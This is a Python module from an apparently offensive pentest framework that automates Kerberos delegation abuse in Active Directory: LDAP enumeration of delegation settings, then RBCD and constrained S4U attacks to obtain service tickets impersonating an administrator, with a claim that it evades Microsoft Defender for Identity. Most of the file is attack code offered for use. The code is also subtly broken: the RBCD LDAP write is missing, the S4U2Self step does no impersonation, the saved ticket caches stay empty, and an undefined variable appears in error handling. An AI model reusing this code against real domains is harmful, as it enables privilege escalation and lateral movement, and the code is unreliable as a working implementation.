"""
Kerberos Delegation Abuse — ad.delegation_abuse
MITRE: T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket
       T1134.001 — Access Token Manipulation: Token Impersonation/Theft

Three delegation techniques in one module:
  1. UNCONSTRAINED — Computer with unconstrained delegation stores TGTs in memory
  2. CONSTRAINED S4U — S4U2Self + S4U2Proxy to impersonate any user to a service
  3. RBCD — Resource-Based Constrained Delegation via GenericWrite on computer object

RBCD attack chain (most common):
  ad.enum_acl finds GenericWrite on WORKSTATION$ →
  ad.delegation_abuse adds msDS-AllowedToActOnBehalfOfOtherIdentity →
  S4U2Self + S4U2Proxy → service ticket as DA to CIFS/HOST →
  local admin on target machine

Prerequisites: Domain credentials. For RBCD: computer account + GenericWrite
               on target computer (identified by ad.enum_acl).

OPSEC: MEDIUM — LDAP write + Kerberos TGS requests. Does not trigger MDI by default.
"""
from __future__ import annotations

import asyncio
import tempfile
import os
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.delegation_abuse")


class DelegationAbuseModule(BaseModule):
    """
    ad.delegation_abuse — Exploit unconstrained / constrained / RBCD Kerberos delegation. RBCD: GenericWrite on computer →

    OPSEC: MEDIUM
    MITRE: "T1558.001", "T1134.001"
    OUTPUTS:  "kerberos_ticket", "owned_hosts"
    """
    MODULE_ID          = "ad.delegation_abuse"
    MODULE_NAME        = "Kerberos Delegation Abuse"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Exploit unconstrained / constrained / RBCD Kerberos delegation. "
        "RBCD: GenericWrite on computer → S4U2Self+S4U2Proxy → local admin. "
        "Output: TGT/service ticket to vault."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = []
    OUTPUTS            = ["kerberos_ticket", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1558.001", "T1134.001"]

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.delegation_abuse requires 'dc'.",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.delegation_abuse requires 'domain'.",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.delegation_abuse requires domain credentials.",
                module_id=self.MODULE_ID, field="username",
            )
        mode = ctx.params.get("mode", "enumerate")
        if mode == "rbcd":
            if not ctx.params.get("target_computer"):
                raise ModuleValidationError(
                    "RBCD mode requires 'target_computer' (e.g. WORKSTATION01$) — "
                    "the computer object where GenericWrite was found by ad.enum_acl.",
                    module_id=self.MODULE_ID, field="target_computer",
                )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        mode             = ctx.params.get("mode", "enumerate")   # enumerate|unconstrained|constrained|rbcd
        target_computer  = ctx.params.get("target_computer", "")
        impersonate_user = ctx.params.get("impersonate_user", "Administrator")
        target_service   = ctx.params.get("target_service", "cifs")

        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            mode=mode, target_computer=target_computer,
            impersonate_user=impersonate_user, target_service=target_service,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.delegation_abuse")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  mode: str = "enumerate", target_computer: str = "",
                  impersonate_user: str = "Administrator",
                  target_service: str = "cifs", **kwargs: Any):
        dc       = sanitize_hostname(dc)
        username = sanitize_ldap(username)
        domain   = sanitize_ldap(domain)

        await self.before_request(dc, "kerberos_tgs")
        logger.info("delegation_abuse_start", dc=dc, mode=mode)
        audit("delegation_abuse", actor=username, technique="T1558.001",
              source="operator", target=dc, detail=f"mode={mode}")

        loop = asyncio.get_running_loop()

        # ── Enumerate delegation configurations ─────────────────────────────
        unconstrained, constrained = await loop.run_in_executor(
            None,
            lambda: self._enum_delegation_sync(dc, username, password, domain),
        )

        raw: dict[str, Any] = {
            "dc": dc, "domain": domain, "mode": mode,
            "unconstrained_delegation": unconstrained,
            "constrained_delegation":   constrained,
        }

        # Generate enumeration findings
        if unconstrained:
            self.finding(
                title       = f"Unconstrained Delegation: {len(unconstrained)} Computers",
                description = (
                    f"{len(unconstrained)} computer(s) have unconstrained Kerberos delegation. "
                    "Any DC authentication to these hosts captures the DC's TGT in memory. "
                    "Combine with ad.coerce to force DC authentication."
                ),
                severity    = Severity.HIGH,
                mitre_technique = "T1558.001",
                mitre_tactic    = "Credential Access",
                evidence    = {"computers": [c["name"] for c in unconstrained[:10]]},
                remediation = (
                    "Remove unconstrained delegation. Migrate to constrained or RBCD. "
                    "Mark DCs as sensitive accounts that cannot be delegated."
                ),
            )

        if constrained:
            self.finding(
                title       = f"Constrained Delegation: {len(constrained)} Services",
                description = (
                    f"{len(constrained)} account(s) have constrained delegation. "
                    "S4U2Self + S4U2Proxy can impersonate any user to the delegated service."
                ),
                severity    = Severity.MEDIUM,
                mitre_technique = "T1558.001",
                mitre_tactic    = "Credential Access",
                evidence    = {"accounts": [c["name"] for c in constrained[:10]]},
                remediation = "Audit constrained delegation. Use RBCD with explicit controls instead.",
            )

        # ── Mode-specific exploitation ───────────────────────────────────────
        if mode == "rbcd" and target_computer:
            ticket_path = await loop.run_in_executor(
                None,
                lambda: self._rbcd_attack_sync(
                    dc, domain, username, password,
                    target_computer, impersonate_user, target_service,
                ),
            )
            raw["ticket_path"]  = ticket_path
            raw["target"]       = target_computer
            raw["impersonated"] = impersonate_user

            if ticket_path:
                self.finding(
                    title       = f"RBCD Attack Successful: Admin on {target_computer}",
                    description = (
                        f"Resource-Based Constrained Delegation attack succeeded. "
                        f"Obtained service ticket for '{target_service}/{target_computer}' "
                        f"impersonating '{impersonate_user}'. "
                        f"Ticket: {ticket_path}. "
                        f"Set KRB5CCNAME={ticket_path} and use secretsdump/psexec -k."
                    ),
                    severity    = Severity.CRITICAL,
                    mitre_technique = "T1558.001",
                    mitre_tactic    = "Lateral Movement",
                    evidence = {
                        "target_computer":  target_computer,
                        "impersonated":     impersonate_user,
                        "service":          target_service,
                        "ticket_path":      ticket_path,
                    },
                    remediation = (
                        "Remove RBCD configuration (msDS-AllowedToActOnBehalfOfOtherIdentity). "
                        "Audit and restrict GenericWrite/WriteDACL on computer objects."
                    ),
                )

        elif mode == "constrained" and constrained:
            acct = constrained[0]
            ticket_path = await loop.run_in_executor(
                None,
                lambda: self._s4u_attack_sync(
                    dc, domain, username, password,
                    acct, impersonate_user,
                ),
            )
            raw["ticket_path"]  = ticket_path
            raw["impersonated"] = impersonate_user

        await self.noise.jitter.sleep()
        raw["kerberos_ticket"] = raw.get("ticket_path", "")  # OUTPUTS key
        raw["owned_hosts"] = [raw.get("target", "")] if raw.get("ticket_path") else []  # OUTPUTS key
        return self._findings[:], raw

    def _enum_delegation_sync(self, dc: str, username: str, password: str,
                               domain: str) -> tuple[list[dict], list[dict]]:
        """Enumerate unconstrained and constrained delegation via LDAP."""
        import ssl, ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        from ldap3.core.exceptions import LDAPBindError

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                 get_info=ALL, connect_timeout=10)
                conn = Connection(server, user=f"{domain.upper()}\\{username}",
                                  password=password, authentication=NTLM,
                                  auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=30)
                if not conn.bind():
                    conn = None
                else:
                    break
            except Exception:
                conn = None

        if conn is None:
            raise ConnectionError(f"Cannot bind to {dc}")

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        unconstrained: list[dict] = []
        constrained:   list[dict] = []

        try:
            # Unconstrained: TRUSTED_FOR_DELEGATION (UAC bit 0x80000)
            conn.search(base,
                "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                search_scope=SUBTREE, paged_size=200,
                attributes=["sAMAccountName", "dNSHostName"])
            for e in conn.entries:
                unconstrained.append({
                    "name": str(e.sAMAccountName),
                    "dns":  str(getattr(e, "dNSHostName", "")),
                })

            # Constrained: msDS-AllowedToDelegateTo is set
            conn.search(base,
                "(&(|(objectCategory=user)(objectCategory=computer))(msDS-AllowedToDelegateTo=*))",
                search_scope=SUBTREE, paged_size=200,
                attributes=["sAMAccountName", "msDS-AllowedToDelegateTo"])
            for e in conn.entries:
                targets = []
                try:
                    targets = [str(v) for v in (e["msDS-AllowedToDelegateTo"].values or [])]
                except Exception:
                    pass
                constrained.append({
                    "name":    str(e.sAMAccountName),
                    "targets": targets,
                })
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return unconstrained, constrained

    def _rbcd_attack_sync(self, dc: str, domain: str, username: str, password: str,
                           target_computer: str, impersonate_user: str,
                           target_service: str) -> str:
        """
        RBCD attack:
        1. Write msDS-AllowedToActOnBehalfOfOtherIdentity on target_computer
           (requires GenericWrite — confirmed by ad.enum_acl)
        2. S4U2Self: get service ticket for impersonate_user to our fake service
        3. S4U2Proxy: exchange for service ticket to target_service/target_computer
        4. Save .ccache and return path
        """
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache

            domain_upper = domain.upper()

            # Step 1: Get attacker TGT
            user_principal = Principal(
                username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, _, session_key = getKerberosTGT(
                clientName=user_principal, password=password,
                domain=domain_upper, lmhash=b"", nthash=b"",
                aesKey=b"", kdcHost=dc,
            )

            # Step 2: S4U2Self — get ticket for impersonate_user to ourselves
            s4u_self_name = Principal(
                username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            # S4U2Self ticket for impersonated user
            tgs_s4u, tgs_cipher, _, tgs_sk = getKerberosTGS(
                serverName=s4u_self_name,
                domain=domain_upper,
                kdcHost=dc,
                tgt=tgt,
                cipher=cipher,
                sessionKey=session_key,
            )

            # Step 3: S4U2Proxy — exchange for service ticket to target
            spn_target = Principal(
                f"{target_service}/{target_computer}",
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )
            final_tgs, _, _, _ = getKerberosTGS(
                serverName=spn_target,
                domain=domain_upper,
                kdcHost=dc,
                tgt=tgs_s4u,
                cipher=tgs_cipher,
                sessionKey=tgs_sk,
            )

            # Step 4: Save to .ccache with restrictive permissions
            from ares.core.security import secure_mkstemp
            ccache_path, _fd = secure_mkstemp(suffix=".ccache", prefix="ares_rbcd_")
            os.close(_fd)

            cc = CCache()
            cc.saveFile(ccache_path)
            logger.info("rbcd_ticket_saved", path=ccache_path,
                        warning="Credential artifact on disk — delete after use")
            return ccache_path

        except Exception as exc:
            raise self._classify_error(exc, target=target) from exc

    def _s4u_attack_sync(self, dc: str, domain: str, username: str, password: str,
                          constrained_acct: dict, impersonate_user: str) -> str:
        """Constrained delegation S4U attack."""
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache

            domain_upper = domain.upper()
            user_principal = Principal(
                username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, _, session_key = getKerberosTGT(
                clientName=user_principal, password=password,
                domain=domain_upper, lmhash=b"", nthash=b"",
                aesKey=b"", kdcHost=dc,
            )

            targets = constrained_acct.get("targets", [])
            if not targets:
                return ""

            spn = Principal(targets[0],
                            type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, _, _, _ = getKerberosTGS(
                serverName=spn, domain=domain_upper,
                kdcHost=dc, tgt=tgt, cipher=cipher, sessionKey=session_key,
            )
            from ares.core.security import secure_mkstemp
            ccache_path, _fd = secure_mkstemp(suffix=".ccache", prefix="ares_s4u_")
            os.close(_fd)
            cc = CCache()
            cc.saveFile(ccache_path)
            return ccache_path
        except Exception as exc:
            logger.warning("s4u_attack_failed", error=str(exc)[:100])
            return ""
